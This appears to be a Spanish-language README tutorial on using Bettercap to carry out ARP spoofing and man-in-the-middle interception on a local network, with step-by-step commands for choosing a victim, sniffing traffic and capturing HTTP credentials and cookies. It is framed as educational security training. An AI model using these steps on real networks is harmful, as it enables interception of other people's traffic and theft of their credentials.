# **Bettercap Network Interception**

### **Framework profesional para la inspección, análisis y comprensión del tráfico de red**

---

## **1. Introducción**

Este repositorio forma parte de la iniciativa educativa de **M-Society**, orientada a enseñar **seguridad ofensiva y análisis de redes** de forma ética, responsable y profesional.

En este proyecto aprenderás a utilizar **Bettercap**, una de las herramientas más potentes para ejecutar ataques **MITM (Man-in-the-Middle)**, realizar **ARP Spoofing**, inspeccionar tráfico de una red local, capturar credenciales en HTTP y visualizar dominios visitados por los dispositivos conectados.

> ⚠️ **Este proyecto es únicamente con fines educativos y de investigación defensiva.**
> El uso inadecuado de las técnicas explicadas está totalmente prohibido y puede ser ilegal.

---

## **2. ¿Qué es Bettercap?**

Bettercap es un framework modular de red diseñado para:

* Interceptar tráfico en redes LAN
* Manipular paquetes
* Realizar ataques MITM
* Realizar ARP Spoofing
* Sniffing de tráfico HTTP y DNS
* Descubrir hosts conectados
* Automatizar ataques complejos
* Analizar tráfico de usuarios en tiempo real

Funciona bajo Linux (Parrot OS, Kali Linux, BlackArch, Debian, etc.).

---

## **3. Requisitos**

### **Sistemas compatibles**

* Parrot OS (viene preinstalado)
* Kali Linux
* Cualquier distro basada en Debian con soporte para Go / paquetes .deb

### **Herramientas necesarias**

* `sudo`
* Bettercap instalado
* Tarjeta de red en modo administrado

---

## **4. Instalación de Bettercap**

Si tu sistema no trae Bettercap preinstalado:

```bash
sudo apt update
sudo apt install bettercap -y
```

O desde repositorio oficial:

```bash
sudo apt install golang -y
go install github.com/bettercap/bettercap@latest
```

Verificar instalación:

```bash
bettercap -version
```

---

## **5. Arquitectura del ataque MITM con Bettercap**

Para entender este proyecto, primero visualiza cómo funciona ARP Spoofing + MITM:

```
          ┌──────────────┐
          │   Víctima    │
          └───────┬──────┘
                  │  (Cree que este es el router)
            ARP Spoofing
                  │
        ┌─────────▼──────────┐
        │     Atacante       │  ← Bettercap
        └─────────▲──────────┘
                  │  (Router real cree que este es la víctima)
            ARP Spoofing
                  │
          ┌───────┴────────┐
          │     Router      │
          └──────────────────┘

Todo el tráfico pasa por el atacante → Sniffing → Log → Visualización
```

---

## **6. Uso de Bettercap – Comandos esenciales**

Inicia Bettercap:

```bash
sudo bettercap
```

Verás una consola tipo framework.

### **6.1 Consultar módulos disponibles**

```bash
help
```

---

## **7. Interceptando tráfico – Tutorial Completo**

A continuación el proceso explicado PASO A PASO con todos los comandos:

---

### **7.1 Habilitar la monitorización de red**

```bash
net.probe on
```

Bettercap comenzará a identificar hosts, protocolos y dispositivos conectados.

---

### **7.2 Activar ARP Spoofing**

```bash
arp.spoof on
```

Esto redirige el tráfico del dispositivo víctima → atacante → router (ataque MITM).

---

### **7.3 Seleccionar un objetivo (target)**

Primero obtén tu IP y el rango de tu red:

```bash
ip a
```

Ejemplo de salida:

```
192.168.1.15/24
```

Lista de dispositivos:

```bash
net.show
```

Especificar la víctima:

```bash
set arp.spoof.targets 192.168.1.20
```

---

### **7.4 Activar el sniffer de tráfico**

```bash
net.sniff on
```

Bettercap comenzará a mostrar:

* requests HTTP
* parámetros POST / GET
* dominios visitados
* información de cabeceras
* datos no cifrados

### **Ejemplo de salida real:**

```
http POST login.php
username=test123
password=pass123
```

Perfecto para prácticas de seguridad web.

---

## **8. Limitaciones – HTTPS y cifrado moderno**

Bettercap **NO puede capturar credenciales** en sitios **HTTPS** modernos.

Funciona únicamente en:

* HTTP
* Formularios no cifrados
* Apps con API insegura
* Sitios legacy

### ¿Por qué?

Porque HTTPS cifra los datos antes de enviarlos.

Antes existía un ataque llamado **SSLStrip**, pero dejó de funcionar por:

* HSTS
* Certificados modernos
* Restricciones del navegador
* Seguridad del lado del servidor

Bettercap aún permite ver:

* Dominios visitados
* Subdominios
* URLs en algunos casos
* DNS queries
* Cloudflare / CDN info

---

## **9. Visto desde un flujo real**

Cuando una víctima entra a Facebook o Instagram:

```
▶ HTTP → Captura total
▶ HTTPS → Verás solo el dominio:
    HOST: facebook.com
    HOST: instagram.com
```

Pero **no** verás sus credenciales.

---

## **10. Imagen conceptual del flujo HTTP interceptado**

```
[ VICTIMA ] --HTTP--> [ MITM (Bettercap) ] ---> [ SERVIDOR ]
                          |
                          ▼
                   Captura:
                   - user
                   - password
                   - cookies
                   - headers
```

---

## **11. Problemas comunes y soluciones**

### **1. No aparece ningún dispositivo**

* Usa:

  ```bash
  net.discover
  ```
* Verifica modo admin:
  `sudo`

### **2. No captura nada**

* El sitio es HTTPS → comportamiento normal.
* Estás atacando a un host fuera del rango.
* El firewall de la víctima bloquea ARP.

### **3. La terminal se llena de basura**

Usaste modo "todos los targets".

Solución:

```bash
set arp.spoof.targets <IP>
```

---

## **12. Uso recomendado en entornos educativos**

Este repositorio es ideal para:

* Cursos de análisis de red
* Prácticas de seguridad defensiva
* Laboratorios de pentesting controlado
* Investigación y aprendizaje de MITM

---

## **13. Licencia – M-Society Open Research License**

Este proyecto está bajo la **M-Society Open Research License**, una licencia creada para permitir:

* Uso personal
* Uso educativo
* Investigación
* Desarrollo de herramientas defensivas
* Auditorías éticas

⚠️ **No permite uso malicioso, comercial sin autorización, ni actividades ilegales.**

---

## **14. Créditos**

Proyecto desarrollado por:

```
                                
                                                ÓÓÙÓÖ                                               
                                       ÓèÙÙÙÙÙÙýýýýýýýÙýýýÙýÚ                                       
                                   ÙdddýýÞ               ÓýÙdddÙÙ                                   
                                ýëëdÖ     Ùdý         Úý$ë     Þëëëý                                
                             ýdëdè   dÚ8Úë               ëÜÚ8é    èdëëý                             
                           ýëëè    ¶øðéÚÚ$8              $$ÚÚ8é¶ð    èëëý                           
                         ýëdÙ   èããGøé88ÜÜ$              Ùë$ÜÜéð¶GãGÞ   Ùëdý                         
                       $dëÙ  $dëppãGø8ÚÚÜ$d              dë$ÜÜéð¶âãmëdÜ  ýdÙÖ                       
                      Ó$Ùý  ÙëëmppãøÚ8Ú$dd                ýë$Ü8ÜðGãpmëëd  ýddÓ                      
                     ýëÙ ÙÙÜÜë ppã øé8Üý   ˆ''‚';::''‚';    èÜÚ8é ãpm Ùëëýý Ùëè                     
                    ÙëÙ ë$ ÜdÙdpmGG¶ð8 Ùëý ‚‚::'˜''¸';:ˆ¸ýýdÓ é8øGGppÙdÙëÜdë ýdý                    
                   ýëÙ Ú$ë dëëp ããGøééÜÜ$dÓ''˜ˆ''':‚¸ˆ…''ýýÙë$é8ðGãm pdëd ëëè ýdý                   
                   $d Óý$Ù$$Ùß ßmãâ¶8dÜ$ëÙÙ'››;›‚'':;››››ÞÙÙd$dÜé¶âmp ßÙ$$Ùëdè Ùë                   
                  $$ÙddÓëddý€ÕmßmGø8 Ü$ëdÙè˜‚¸':‚';':‚'''ÖýÙdë$ëÜðâã€ÛAßÓÙdëý$dÙëd                  
                 dÜÙ ëd ÙÙëd€€ßmGø8$dÙýýÙýÓÖ''˜'¸‚'''˜''ÿÖÞÙèèèý ÚøGmßpßÙ$ýÙÓÙë ý$d                 
                 ë$d dë ë$d€ ßpãGøÚ $ëëdýýèèP';‹:''';›:ÞÞÓèèÙdd$Ú$ð¶ãpß Aë$Ù dë dëý                 
                 $$ Ùýëè$d €€€ßãGéëÜÜ$ddýýèÓÖ '››''‹›‚ ÖÞèèýýÙdëÙÙé¶mpAß€ ÙëýëdÙ ëë                 
                 $ë d dëÙýÙßß€pâø8ýýëëdÙýèÓÓ''  '';  `' åÖÓèýýÙdýdÚøâp€ppýýëëd Ù dë                 
                 ëd ëdÙÙè$èßßßãGéÜèèýýÓåÞ   ˜'…''¸'‚'':¸   ÿÒÿèèÓÜdÜ¶mm€mýëÙëýdë Ùd                 
                 ëd ëëd Ùë ppßmâø8ëè        ˆ'        '         ÞèÜ8Gãßpp ëë dëë dd                 
                 $$ ðëëdëëÓßÛßm¶8            :':››››'˜;            Ú¶mpßãøë$ýëë8 ë$                 
                 ë$èè ëdëè$$Gpmâ             '››¹;›‹°‹‚             ¶mpß8$ý$ëë Ùý$Ù                 
                 ë$ÙÙë ýë dë¶mm¶              :‹‹››‹¹›              éãp¶$d $ë $dýëý                 
                  ë$dd$Ù  Ù$ Ôm               ‚››‹­‹›ˆ               ¶ã dÙ øë$dëëë                  
                  ë$Ù Ù$$Ùdë$ð                 '‹––‹:                 8 ëëd$$ý d$Ù                  
                   ÙëÙ  ë$ëÙëøð                 '››;                 Ú8dëë$d  Ù$Ù                   
                    ëëýÖÙ  Ù$                   ˆ‹‹´                   $d  dýÓëë                    
                     ÙëÙ d$ëëý                   ‚˜                    dë$ëëdëd                     
                      ÙëÙ  Ù$d                                        ëëý  ÙëÙ                      
                       ýëë  Ö        ý                        è        å  ëëÙ                       
                         d$Ù                                            è$ë                         
                          ë$$d                                        d$$d                          
                            Ù$$ëÜ                                   Ù$ëë                            
                               ÙÜÜÙ                              ÙÜ$Ù                               
                                 éëÜÜë                        d$$dÙ                                 
                                     $                                                                                                                                  
```
Investigación: **M-Society CyberSec Division**

---

## **15. Contribuciones**

Pull requests son bienvenidas.
Reporta problemas en *Issues* con logs, sistema operativo y versión de Bettercap.

---

## **16. Descargo de responsabilidad**

Todo el contenido es **solo educativo**.
Eres responsable del uso que le des.
